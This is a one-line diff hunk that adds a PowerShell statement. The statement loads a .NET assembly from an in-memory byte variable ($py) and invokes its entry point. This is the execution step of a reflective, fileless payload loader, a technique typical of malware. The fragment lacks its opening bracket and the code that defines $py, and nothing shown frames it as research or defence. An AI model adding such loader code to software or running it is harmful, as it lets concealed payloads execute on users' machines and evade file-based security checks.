@@ -1,0 +1,1 @@
+System.Reflection.Assembly]::Load($py).EntryPoint.Invoke(0,@(,$null))
